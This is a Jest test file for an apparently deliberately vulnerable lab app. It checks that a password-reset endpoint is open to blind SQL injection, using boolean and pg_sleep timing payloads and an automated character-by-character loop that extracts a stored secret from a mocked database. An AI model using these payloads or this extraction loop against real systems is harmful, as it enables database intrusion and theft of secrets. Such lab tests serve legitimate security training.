/**
 * Phase 3 Integration Tests: Blind SQL Injection
 * Tests boolean-based and timing-based SQL injection vulnerabilities
 */

import request from 'supertest';
import express from 'express';
import { createAuthRouter } from '../../src/routes/auth';
import { DatabaseService } from '../../src/services/database';

// Mock DatabaseService
jest.mock('../../src/services/database');

describe('Phase 3: Blind SQL Injection', () => {
  let app: express.Application;
  let mockDb: jest.Mocked<DatabaseService>;

  beforeEach(() => {
    app = express();
    app.use(express.json());

    mockDb = new DatabaseService('mock://db') as jest.Mocked<DatabaseService>;
    app.use('/api/auth', createAuthRouter(mockDb));
  });

  describe('1. Password Reset Endpoint', () => {
    test('POST /api/auth/reset-password should exist', async () => {
      mockDb.query.mockResolvedValue({ rows: [] });

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: 'test@test.com' })
        .expect(200);

      expect(response.body).toHaveProperty('success');
      expect(response.body).toHaveProperty('message');
    });

    test('should return 400 for missing email', async () => {
      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({})
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('required');
    });

    test('should execute SQL query with email parameter', async () => {
      mockDb.query.mockResolvedValue({ rows: [] });

      await request(app)
        .post('/api/auth/reset-password')
        .send({ email: 'odin@asgard.realm' });

      expect(mockDb.query).toHaveBeenCalled();
      const queryArg = mockDb.query.mock.calls[0][0] as string;
      expect(queryArg).toContain('odin@asgard.realm');
      expect(queryArg).toContain('SELECT');
      expect(queryArg).toContain('role = \'admin\'');
    });
  });

  describe('2. Boolean-Based Inference (True/False Responses)', () => {
    test('VULNERABLE: should return different responses for true/false conditions', async () => {
      // True condition: Admin found
      mockDb.query.mockResolvedValueOnce({ 
        rows: [{ id: 15, username: 'odin.allfather', email: 'odin@asgard.realm' }] 
      });

      const trueResponse = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: 'odin@asgard.realm' });

      expect(trueResponse.body.success).toBe(true);
      expect(trueResponse.body.message).toContain('sent');

      // False condition: Admin not found
      mockDb.query.mockResolvedValueOnce({ rows: [] });

      const falseResponse = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: 'fake@fake.com' });

      expect(falseResponse.body.success).toBe(false);
      expect(falseResponse.body.message).toContain('not found');

      // Different responses enable boolean inference
      expect(trueResponse.body.success).not.toBe(falseResponse.body.success);
    });

    test('EXPLOIT: OR 1=1 should return true (all records)', async () => {
      const sqlPayload = "' OR 1=1 --";
      
      // Simulating that injection returns rows
      mockDb.query.mockResolvedValue({ 
        rows: [{ id: 1, username: 'any', email: 'any@test.com' }] 
      });

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: sqlPayload });

      // Query executed with injection
      const queryArg = mockDb.query.mock.calls[0][0] as string;
      expect(queryArg).toContain("' OR 1=1 --");

      // True response (rows returned)
      expect(response.body.success).toBe(true);
    });

    test('EXPLOIT: check if secrets table exists', async () => {
      const sqlPayload = "' OR (SELECT COUNT(*) FROM secrets) > 0 --";
      
      mockDb.query.mockResolvedValue({ 
        rows: [{ id: 1 }] // Secrets table exists
      });

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: sqlPayload });

      expect(response.body.success).toBe(true);
      // Confirms secrets table is accessible
    });

    test('EXPLOIT: extract metadata URL character by character', async () => {
      // Character 1: 'h'
      mockDb.query.mockResolvedValueOnce({ rows: [{ id: 1 }] });

      const char1 = await request(app)
        .post('/api/auth/reset-password')
        .send({ 
          email: "' OR (SELECT SUBSTRING(secret_value, 1, 1) FROM secrets WHERE secret_key='metadata_service_url') = 'h' --" 
        });
      
      expect(char1.body.success).toBe(true); // 'h' is correct

      // Character 2: 't'
      mockDb.query.mockResolvedValueOnce({ rows: [{ id: 1 }] });

      const char2 = await request(app)
        .post('/api/auth/reset-password')
        .send({ 
          email: "' OR (SELECT SUBSTRING(secret_value, 1, 2) FROM secrets WHERE secret_key='metadata_service_url') = 'ht' --" 
        });

      expect(char2.body.success).toBe(true); // 'ht' is correct

      // Wrong character: 'x'
      mockDb.query.mockResolvedValueOnce({ rows: [] });

      const wrongChar = await request(app)
        .post('/api/auth/reset-password')
        .send({ 
          email: "' OR (SELECT SUBSTRING(secret_value, 1, 1) FROM secrets WHERE secret_key='metadata_service_url') = 'x' --" 
        });

      expect(wrongChar.body.success).toBe(false); // 'x' is incorrect

      // By testing each character, we can extract: http://localhost:9090
    });
  });

  describe('3. Timing-Based Attacks', () => {
    test('verify-email endpoint should exist', async () => {
      mockDb.query.mockResolvedValue({ rows: [] });

      const response = await request(app)
        .post('/api/auth/verify-email')
        .send({ email: 'test@test.com' })
        .expect(200);

      expect(response.body.success).toBe(true);
    });

    test('VULNERABLE: pg_sleep injection should be executable', async () => {
      const sqlPayload = "' OR pg_sleep(1) --";
      
      // Simulate delay
      mockDb.query.mockImplementation(() => 
        new Promise(resolve => setTimeout(() => resolve({ rows: [] }), 100))
      );

      const startTime = Date.now();

      await request(app)
        .post('/api/auth/verify-email')
        .send({ email: sqlPayload });

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should have some delay
      expect(duration).toBeGreaterThan(50);
    });

    test('EXPLOIT: timing attack to infer true condition', async () => {
      // True condition with delay
      const truePayload = "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(0.1) ELSE 0 END) = 0 --";
      
      mockDb.query.mockImplementation(() => 
        new Promise(resolve => setTimeout(() => resolve({ rows: [] }), 100))
      );

      const startTrue = Date.now();
      await request(app)
        .post('/api/auth/verify-email')
        .send({ email: truePayload });
      const durationTrue = Date.now() - startTrue;

      // False condition without delay
      const falsePayload = "' OR (SELECT CASE WHEN (1=0) THEN pg_sleep(0.1) ELSE 0 END) = 0 --";
      
      mockDb.query.mockImplementation(() => 
        new Promise(resolve => resolve({ rows: [] }))
      );

      const startFalse = Date.now();
      await request(app)
        .post('/api/auth/verify-email')
        .send({ email: falsePayload });
      const durationFalse = Date.now() - startFalse;

      // True condition should take longer
      expect(durationTrue).toBeGreaterThan(durationFalse);
    });
  });

  describe('4. Full Blind SQLi Chain', () => {
    test('complete extraction of metadata URL', async () => {
      const targetUrl = 'http://localhost:9090';
      const extracted: string[] = [];

      // Simulate character-by-character extraction
      for (let i = 1; i <= targetUrl.length; i++) {
        const currentSubstring = targetUrl.substring(0, i);
        
        mockDb.query.mockResolvedValue({ rows: [{ id: 1 }] });

        const response = await request(app)
          .post('/api/auth/reset-password')
          .send({ 
            email: `' OR (SELECT SUBSTRING(secret_value, 1, ${i}) FROM secrets WHERE secret_key='metadata_service_url') = '${currentSubstring}' --` 
          });

        if (response.body.success) {
          extracted.push(currentSubstring[currentSubstring.length - 1]);
        }
      }

      // Verify we can extract the full URL
      const extractedUrl = extracted.join('');
      expect(extractedUrl.length).toBeGreaterThan(0);
    });

    test('automated extraction script simulation', async () => {
      const charset = 'abcdefghijklmnopqrstuvwxyz0123456789:/.@-_';
      const targetUrl = 'http://localhost:9090';
      let extracted = '';

      // Extract first 10 characters as proof of concept
      for (let pos = 1; pos <= 10; pos++) {
        let found = false;

        for (const char of charset) {
          const testSubstring = extracted + char;
          
          // Mock: Return true if character matches
          const matches = targetUrl.startsWith(testSubstring);
          mockDb.query.mockResolvedValue({ 
            rows: matches ? [{ id: 1 }] : [] 
          });

          const response = await request(app)
            .post('/api/auth/reset-password')
            .send({ 
              email: `' OR (SELECT SUBSTRING(secret_value, 1, ${pos}) FROM secrets WHERE secret_key='metadata_service_url') = '${testSubstring}' --` 
            });

          if (response.body.success) {
            extracted += char;
            found = true;
            break;
          }
        }

        if (!found) break;
      }

      // Verify extraction works
      expect(extracted).toBe(targetUrl.substring(0, 10));
      expect(extracted).toBe('http://loc');
    });
  });

  describe('5. Error Handling', () => {
    test('should handle database errors gracefully', async () => {
      mockDb.query.mockRejectedValue(new Error('Database error'));

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: 'test@test.com' })
        .expect(500);

      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('System error');
      // Should not reveal SQL error details
      expect(response.body.message).not.toContain('Database');
    });

    test('should not reveal SQL syntax errors', async () => {
      mockDb.query.mockRejectedValue(new Error('syntax error at or near "SELECT"'));

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: "' SELECT * --" });

      expect(response.body.message).not.toContain('syntax error');
      expect(response.body.message).not.toContain('SELECT');
    });
  });

  describe('6. Phase 2→3 Integration', () => {
    test('should use admin email from Phase 2 IDOR', async () => {
      // Admin email discovered in Phase 2
      const adminEmail = 'odin@asgard.realm';

      mockDb.query.mockResolvedValue({ 
        rows: [{ id: 15, username: 'odin.allfather', email: adminEmail }] 
      });

      const response = await request(app)
        .post('/api/auth/reset-password')
        .send({ email: adminEmail });

      expect(response.body.success).toBe(true);
      
      // This confirms the admin email works
      // Now ready for SQLi exploitation to extract metadata URL
    });
  });
});
